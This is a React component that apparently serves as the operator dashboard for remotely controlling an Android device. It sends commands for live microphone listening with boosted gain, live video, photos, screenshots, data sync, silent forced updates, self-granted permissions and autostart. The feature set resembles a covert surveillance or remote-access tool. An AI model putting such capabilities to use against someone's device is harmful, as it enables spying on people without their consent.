import { useEffect, useMemo, useState } from 'react';
const GAIN_LEVELS = [{
  label: '1× Normal',
  value: 1.0,
  color: '#a1a1aa',
  bg: '#27272a'
}, {
  label: '1.5× Boost',
  value: 1.5,
  color: '#bae6fd',
  bg: '#0284c7'
}, {
  label: '2× Loud',
  value: 2.0,
  color: '#6ee7b7',
  bg: '#059669'
}, {
  label: '3× Max',
  value: 3.0,
  color: '#fde68a',
  bg: '#d97706'
}, {
  label: '4× Ultra',
  value: 4.0,
  color: '#fecaca',
  bg: '#dc2626'
}];
const VOICE_PROFILES = ['near', 'room', 'far'];
const VOICE_ICONS = {
  near: '🎙',
  room: '🔊',
  far: '📢'
};
const VOICE_COLORS = {
  near: {
    color: '#e0f2fe',
    bg: '#0284c7',
    border: '#0369a1'
  },
  room: {
    color: '#e0e7ff',
    bg: '#4f46e5',
    border: '#3730a3'
  },
  far: {
    color: '#fef3c7',
    bg: '#d97706',
    border: '#b45309'
  }
};
const NIGHT_MODES = ['off', '1s', '3s', '5s'];
const NIGHT_LABELS = {
  off: 'Night: Off',
  '1s': 'Night: Low',
  '3s': 'Night: Med',
  '5s': 'Night: High'
};
export function ControlButtons({
  onCommand,
  health,
  isStreaming = false,
  isWebRtcActive = false,
  isCameraLive = false,
  isConnected = false,
  deviceId,
  pendingCommands = {}
}) {
  const [voiceProfile, setVoiceProfile] = useState(health?.voiceProfile || 'room');
  const [photoNight, setPhotoNight] = useState(health?.photoNight || 'off');
  const [gainIndex, setGainIndex] = useState(0);
  const [lastPhotoCam, setLastPhotoCam] = useState(null);

  const statusFor = useMemo(() => {
    return cmd => {
      if (!deviceId) return null;
      return pendingCommands[`${deviceId}:${cmd}`]?.status || null;
    };
  }, [deviceId, pendingCommands]);
  const isPending = useMemo(() => {
    return cmd => {
      const status = statusFor(cmd);
      return status === 'sending' || status === 'queued';
    };
  }, [statusFor]);
  const disabledAll = !isConnected || !deviceId;
  const resolveGainIndex = (level) => {
    if (!Number.isFinite(level)) return null;
    let closest = 0;
    let bestDiff = Infinity;
    for (let i = 0; i < GAIN_LEVELS.length; i++) {
      const diff = Math.abs(GAIN_LEVELS[i].value - level);
      if (diff < bestDiff) {
        bestDiff = diff;
        closest = i;
      }
    }
    return closest;
  };
  useEffect(() => {
    if (!health?.voiceProfile) return;
    if (!VOICE_PROFILES.includes(health.voiceProfile)) return;
    setVoiceProfile(health.voiceProfile);
  }, [health?.voiceProfile]);
  useEffect(() => {
    if (!health?.photoNight) return;
    if (!NIGHT_MODES.includes(health.photoNight)) return;
    setPhotoNight(health.photoNight);
  }, [health?.photoNight]);
  useEffect(() => {
    const nextIndex = resolveGainIndex(Number(health?.gainLevel));
    if (nextIndex === null) return;
    setGainIndex(current => current === nextIndex ? current : nextIndex);
  }, [health?.gainLevel]);
  const cycleVoiceProfile = () => {
    if (disabledAll || isPending('voice_profile')) return;
    const next = VOICE_PROFILES[(VOICE_PROFILES.indexOf(voiceProfile) + 1) % VOICE_PROFILES.length];
    setVoiceProfile(next);
    onCommand('voice_profile', {
      profile: next
    });
  };
  const cyclePhotoNight = () => {
    if (disabledAll || isPending('photo_night')) return;
    const next = NIGHT_MODES[(NIGHT_MODES.indexOf(photoNight) + 1) % NIGHT_MODES.length];
    setPhotoNight(next);
    onCommand('photo_night', {
      mode: next
    });
  };
  const cycleGain = () => {
    if (disabledAll || isPending('set_gain')) return;
    const nextIndex = (gainIndex + 1) % GAIN_LEVELS.length;
    setGainIndex(nextIndex);
    onCommand('set_gain', {
      level: GAIN_LEVELS[nextIndex].value
    });
  };
  const handlePhotoCommand = (cam) => {
    setLastPhotoCam(cam);
    onCommand('take_photo', { camera: cam });
  };
  const gain = GAIN_LEVELS[gainIndex];
  const vc = VOICE_COLORS[voiceProfile];
  const voiceStatus = statusFor('voice_profile');
  const gainStatus = statusFor('set_gain');
  return <div className="space-y-4">
      {/* ── Audio ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="🎙" label="Audio" />
        <div className="grid grid-cols-2 gap-2">
          {/* Live Listen */}
          <BigBtn icon={isStreaming ? '⏹' : '🎧'} label={isPending(isStreaming ? 'stop_stream' : 'start_stream') ? 'Working...' : isStreaming ? 'Stop Listen' : 'Live Listen'} onClick={() => onCommand(isStreaming ? 'stop_stream' : 'start_stream')} active={isStreaming} activeColor="#10b981" activeBorder="#059669" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" disabled={disabledAll || isPending(isStreaming ? 'stop_stream' : 'start_stream')} status={statusFor(isStreaming ? 'stop_stream' : 'start_stream')} />
          {/* WebRTC */}
          <BigBtn icon="📡" label={isPending(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start') ? 'Working...' : isWebRtcActive ? 'Stop WebRTC' : 'WebRTC'} onClick={() => onCommand(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start')} active={isWebRtcActive} activeColor="#3b82f6" activeBorder="#2563eb" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" disabled={disabledAll || isPending(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start')} status={statusFor(isWebRtcActive ? 'webrtc_stop' : 'webrtc_start')} />

          {/* Voice Profile */}
          <button onClick={cycleVoiceProfile} disabled={disabledAll || isPending('voice_profile')} className="rounded-lg px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200 text-center font-semibold disabled:opacity-60 disabled:cursor-not-allowed" style={{
          background: vc.bg,
          border: `2px solid ${vc.border}`,
          color: vc.color
        }}>
            <span className="text-xl">{VOICE_ICONS[voiceProfile]}</span>
            <span className="text-[10px] font-bold uppercase tracking-wider">
              Voice: {voiceProfile.charAt(0).toUpperCase() + voiceProfile.slice(1)}
            </span>
            <CommandStatusPill status={voiceStatus} size="xs" className="mt-1" />
          </button>
        </div>

        {/* Gain slider-style row */}
        <button onClick={cycleGain} disabled={disabledAll || isPending('set_gain')} className="w-full mt-2 rounded-lg px-4 py-2.5 flex items-center justify-between gap-3 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed" style={{
        background: gain.bg,
        border: `2px solid ${gain.bg === '#27272a' ? '#3f3f46' : gain.color}`,
        color: gain.color
      }}>
          <span className="text-base">🔊</span>
          <span className="text-xs font-bold flex-1 text-left">
            Gain: {gain.label}
          </span>
          {/* Visual gain meter */}
          <div className="flex items-end gap-0.5 h-4">
            {GAIN_LEVELS.map((_, i) => <div key={i} className="w-1.5 rounded-sm transition-all duration-300" style={{
            height: `${4 + i * 20}%`,
            background: i <= gainIndex ? gain.color : `${gain.color}25`,
            minHeight: '4px'
          }} />)}
          </div>
          <div className="flex items-center gap-2">
            <CommandStatusPill status={gainStatus} size="xs" />
            <span className="text-[10px] opacity-60">TAP TO CYCLE</span>
          </div>
        </button>
      </section>

      {/* ── Camera ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="📷" label="Camera" />
        <div className="grid grid-cols-2 gap-2">
          <BigBtn icon={isCameraLive ? '📺' : '📺'} label={isPending(isCameraLive ? 'camera_live_stop' : 'camera_live_start') ? 'Working...' : isCameraLive ? 'Stop Video' : 'Live Video'} onClick={() => onCommand(isCameraLive ? 'camera_live_stop' : 'camera_live_start')} active={isCameraLive} activeColor="#ef4444" activeBorder="#dc2626" activeText="#ffffff" inactiveColor="#27272a" inactiveBorder="#3f3f46" inactiveText="#a1a1aa" disabled={disabledAll || isPending(isCameraLive ? 'camera_live_stop' : 'camera_live_start')} status={statusFor(isCameraLive ? 'camera_live_stop' : 'camera_live_start')} />
          <SmallBtn icon="📷" label="Front Cam" onClick={() => handlePhotoCommand('front')} color="#38bdf8" disabled={disabledAll || isPending('take_photo')} status={lastPhotoCam === 'front' ? statusFor('take_photo') : null} />
          <SmallBtn icon="📷" label="Rear Cam" onClick={() => handlePhotoCommand('rear')} color="#818cf8" disabled={disabledAll || isPending('take_photo')} status={lastPhotoCam === 'rear' ? statusFor('take_photo') : null} />
          <SmallBtn icon="🌙" label={isPending('photo_night') ? 'Updating...' : NIGHT_LABELS[photoNight]} onClick={cyclePhotoNight} color={photoNight !== 'off' ? '#e879f9' : '#64748b'} active={photoNight !== 'off'} disabled={disabledAll || isPending('photo_night')} status={statusFor('photo_night')} />
          <SmallBtn icon="📸" label="Screenshot" onClick={() => onCommand('take_screenshot')} color="#a78bfa" disabled={disabledAll || isPending('take_screenshot')} status={statusFor('take_screenshot')} />
        </div>
      </section>

      {/* ── System ──────────────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="⚙️" label="System" />
        <div className="grid grid-cols-2 gap-2">
          <SmallBtn icon="📥" label={isPending('get_data') ? 'Syncing...' : 'Sync Data'} onClick={() => onCommand('get_data')} color="#38bdf8" disabled={disabledAll || isPending('get_data')} status={statusFor('get_data')} />
          <SmallBtn icon="⬆️" label={isPending('force_update') ? 'Updating...' : 'Force Update'} onClick={() => onCommand('force_update')} color="#818cf8" tooltip="Silent if Device Owner" disabled={disabledAll || isPending('force_update')} status={statusFor('force_update')} />
          <SmallBtn icon="🔐" label={isPending('grant_permissions') ? 'Granting...' : 'Grant Perms'} onClick={() => onCommand('grant_permissions')} color="#818cf8" tooltip="Requires Device Owner" disabled={disabledAll || isPending('grant_permissions')} status={statusFor('grant_permissions')} />
          <SmallBtn icon="🚀" label={isPending('enable_autostart') ? 'Enabling...' : 'Autostart'} onClick={() => onCommand('enable_autostart')} color="#fb923c" tooltip="Requires Device Owner" disabled={disabledAll || isPending('enable_autostart')} status={statusFor('enable_autostart')} />
        </div>
      </section>

      {/* ── Device Control ───────────────────────────────────────────────── */}
      <section>
        <SectionHead icon="🎮" label="Device Control" />
        <div className="grid grid-cols-3 gap-2">
          <SmallBtn icon="🔊" label="Vol Up" onClick={() => onCommand('system_action', { action: 'volume_up' })} color="#34d399" disabled={disabledAll || isPending('system_action')} status={statusFor('system_action')} />
          <SmallBtn icon="🔉" label="Vol Down" onClick={() => onCommand('system_action', { action: 'volume_down' })} color="#fbbf24" disabled={disabledAll || isPending('system_action')} />
          <SmallBtn icon="🔇" label="Mute" onClick={() => onCommand('system_action', { action: 'volume_mute' })} color="#f87171" disabled={disabledAll || isPending('system_action')} />
        </div>
        <div className="grid grid-cols-3 gap-2 mt-2">
          <SmallBtn icon="🏠" label="Home" onClick={() => onCommand('system_action', { action: 'home' })} color="#60a5fa" disabled={disabledAll || isPending('system_action')} />
          <SmallBtn icon="◀️" label="Back" onClick={() => onCommand('system_action', { action: 'back' })} color="#a78bfa" disabled={disabledAll || isPending('system_action')} />
          <SmallBtn icon="🗂" label="Recents" onClick={() => onCommand('system_action', { action: 'recents' })} color="#c084fc" disabled={disabledAll || isPending('system_action')} />
        </div>
        <div className="grid grid-cols-2 gap-2 mt-2">
          <SmallBtn icon="⏻" label="Power Menu" onClick={() => onCommand('system_action', { action: 'power_dialog' })} color="#fb923c" tooltip="Opens Power Off / Restart dialog" disabled={disabledAll || isPending('system_action')} />
          <SmallBtn icon="🔒" label="Lock Screen" onClick={() => onCommand('system_action', { action: 'lock_screen' })} color="#f43f5e" tooltip="Turns off screen instantly" disabled={disabledAll || isPending('system_action')} />
        </div>
      </section>
    </div>;
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function SectionHead({
  icon,
  label
}) {
  return <div className="flex items-center gap-2 mb-2">
      <span className="text-sm">{icon}</span>
      <span className="text-[10px] uppercase tracking-widest font-bold text-cyan-300">{label}</span>
      <span className="flex-1 h-px" style={{
      background: 'linear-gradient(90deg, rgba(34,211,238,0.45), transparent)'
    }} />
    </div>;
}
function BigBtn({
  icon,
  label,
  onClick,
  active,
  activeColor,
  activeBorder,
  activeText,
  inactiveColor,
  inactiveBorder,
  inactiveText,
  disabled = false,
  status
}) {
  const bg = active ? activeColor : inactiveColor;
  const border = active ? activeBorder : inactiveBorder;
  const color = active ? activeText : inactiveText;
  return <button onClick={onClick} disabled={disabled} className="rounded-xl px-3 py-3 flex flex-col items-center gap-1 transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed" style={{
    background: bg,
    border: `1px solid ${border}`,
    color,
    boxShadow: active ? `0 0 20px ${activeColor}` : '0 10px 20px rgba(2,6,23,0.24)'
  }} onMouseEnter={e => {
    if (disabled) return;
    e.currentTarget.style.transform = 'scale(1.02)';
  }} onMouseLeave={e => {
    if (disabled) return;
    e.currentTarget.style.transform = 'scale(1)';
  }}>
      <span className="text-xl">{icon}</span>
      <span className="text-[10px] font-bold uppercase tracking-wider text-center leading-tight">{label}</span>
      <CommandStatusPill status={status} size="xs" />
    </button>;
}
function SmallBtn({
  icon,
  label,
  onClick,
  color,
  active = false,
  tooltip,
  disabled = false,
  status
}) {
  return <button onClick={onClick} disabled={disabled} title={tooltip} className="rounded-xl px-3 py-2.5 flex items-center gap-2 text-left transition-all duration-200 w-full disabled:opacity-60 disabled:cursor-not-allowed" style={{
    background: active ? `${color}22` : 'linear-gradient(165deg, rgba(30,41,59,0.42), rgba(15,23,42,0.34))',
    border: `1px solid ${active ? `${color}50` : 'rgba(148,163,184,0.14)'}`,
    color: active ? color : '#94a3b8'
  }} onMouseEnter={e => {
    if (disabled) return;
    e.currentTarget.style.background = `${color}18`;
  }} onMouseLeave={e => {
    if (disabled) return;
    e.currentTarget.style.background = active ? `${color}22` : 'rgba(255,255,255,0.04)';
  }}>
      <span className="text-lg">{icon}</span>
      <span className="text-[10px] font-bold uppercase tracking-wider text-center leading-tight">{label}</span>
      <CommandStatusPill status={status} size="xs" className="ml-auto" />
    </button>;
}
const COMMAND_STATUS_META = {
  pending: {
    label: 'Pending',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.16)',
    border: 'rgba(245,158,11,0.35)'
  },
  sent: {
    label: 'Sent',
    color: '#34d399',
    bg: 'rgba(16,185,129,0.16)',
    border: 'rgba(16,185,129,0.35)'
  },
  ack: {
    label: 'Ack',
    color: '#a78bfa',
    bg: 'rgba(167,139,250,0.16)',
    border: 'rgba(167,139,250,0.35)'
  },
  error: {
    label: 'Error',
    color: '#f87171',
    bg: 'rgba(239,68,68,0.16)',
    border: 'rgba(239,68,68,0.35)'
  }
};
const normalizeCommandStatus = status => {
  if (status === 'sending' || status === 'queued') return 'pending';
  if (status === 'success') return 'ack';
  return status;
};
function CommandStatusPill({
  status,
  size = 'sm',
  className = ''
}) {
  const meta = COMMAND_STATUS_META[normalizeCommandStatus(status)];
  if (!meta) return null;
  const sizeClasses = size === 'xs' ? 'px-1.5 py-0.5 text-[8px]' : 'px-2 py-0.5 text-[9px]';
  return <span className={`inline-flex items-center gap-1 rounded-full font-semibold uppercase tracking-wider ${sizeClasses} ${className}`} style={{
    background: meta.bg,
    border: `1px solid ${meta.border}`,
    color: meta.color
  }}>
      <span className="w-1 h-1 rounded-full bg-current" />
      {meta.label}
    </span>;
}